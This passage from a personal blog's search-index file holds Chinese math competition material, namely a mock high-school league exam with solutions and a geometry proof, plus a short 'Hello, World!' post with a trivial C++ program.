\cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p><strong>解析 </strong> 椭圆的方程为$C:\frac{x^2}{4}+\frac{y^2}{3}=1$.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p><strong>解析 </strong> 设点$M(x_1, y_1), N(x_2, y_2)$.</p><p>将$y=kx+m$代入椭圆的方程, 得</p><script type="math/tex; mode=display">(4k^2+3)x^2+8kmx+4m^2-12=0,</script><p>所以</p><script type="math/tex; mode=display">x_1+x_2=-\frac{8km}{4k^2+3}, x_1x_2=\frac{4m^2-12}{4k^2+3}.</script><p>进而$y_1y_2=k^2x_1x_2+km(x_1+x_2)+m^2$.</p><p>因为以$MN$为直径的圆过点$A$, 所以$\overrightarrow{AM}\cdot\overrightarrow{AN}=0$, 所以</p><script type="math/tex; mode=display">7m^2+16km+4k^2=0.</script><p>解得$m=-\frac{2}{7}k$, 或$m=-2k$, 均满足$\Delta &gt;0$.</p><p>若$m=-2k$, 直线$l$恒过定点$(2, 0)$, 不合题意, 舍去;</p><p>若$m=-\frac{2}{7}k$, 直线$l:y=k(x-\frac{2}{7})$恒过定点$(\frac{2}{7}, 0)$.</p><p><strong>11. </strong> 在等腰$\triangle ABC$中, $AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p><p><strong>解析 </strong> 过$B$作$BF//AY$, 交$YX$的延长线于$F$.</p><p>由$BF//AY,AB//XY$知四边形$ABFY$为平行四边形.</p><p>由$E$为$BY$的中点,得$E$为$AF$的中点.</p><p>由$AB=AC$,有$\angle ABC = \angle ACB$,于是$\angle YXC=\angle ABC$,从而$YX=YC$.</p><p>连接$FD, DC, DA, DY$,则$\angle FYD = \angle CYD$.</p><p>由$AC=YF,DY=DC,\angle DCA=\angle DYF$,知$\triangle ADC\cong\triangle FDY$.</p><p>有$DA=DF$,而$E$为$AF$的中点,则$DE\bot AF$,即$\angle AED=90^\circ$.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948296.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/02/ji-he-yi-kui-09-02/"/>
      <url>/2022/09/02/ji-he-yi-kui-09-02/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>在$\triangle ABC$中, $\angle BAC$的平分线与$\triangle ABC$的外接圆的另一交点为$D$, $M$是$BC$的中点, $P$是过点$M$且垂直于$AD$的直线上一点, 过点$P$且垂直于$PD$的直线与直线$AB, AC$分别交于$E, F$. 求证: $P$是$EF$的中点.</p><p><strong>Proof:</strong></p><p>由点$D$向边$AB, AC$作垂线, 垂足分别为$G, H$. 连接$DE, DF$.</p><p>因为点$D$在$\triangle ABC$的外接圆上, 且$DG\perp AB, DH\perp AC, DM\perp BC$， </p><p>故由$Simson$定理, 知$G, H, M$三点共线. </p><p>又因$AD$平分$\angle BAC$， 故$DG=DH$, 且$GH\perp AD$, 结合$MP\perp AD$，</p><p>知$G, H, M, P$四点共线.</p><p>那么由$\angle DPE=\angle DGE=90^\circ$, 知$P, D, E, G$四点共圆,</p><p>同理知$P, D, F, H$四点共圆.</p><p>那么</p><script type="math/tex; mode=display">\angle DEG=\angle DPG=\angle DFH, \mbox{结合}DG=DH,</script><p>知</p><script type="math/tex; mode=display">\triangle DEG \cong\triangle DFH,</script><p>那么$DE=DF$. 又$DP\perp EF$, 故$P$为线段$EF$中点.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948299.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题</title>
      <link href="/2022/08/29/gao-lian-yi-shi-mo-ni-shi-ti/"/>
      <url>/2022/08/29/gao-lian-yi-shi-mo-ni-shi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p><strong>1. </strong> 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>2. </strong> 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>3. </strong> 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>4. </strong> $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>5. </strong> 在数列${\left\{a_n\right\}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left\{ a_n \right\}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>6. </strong> 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. </p><p>若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>7. </strong> 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>8. </strong> 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p><strong>9. </strong> 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p><strong>10. </strong> 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} \cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p><strong>11. </strong> 在等腰$\triangle ABC$中, $AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, World!</title>
      <link href="/2022/08/26/hello-world/"/>
      <url>/2022/08/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://chengsx21.github.io/">Endeavor</a>!   </p><p>This is my very first post.   </p><p>If you get any problems when using this site, always ask me on <a href="https://github.com/chengsx21/chengsx21.github.io/issues">GitHub</a>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello world!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Welcome to Endeavor!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
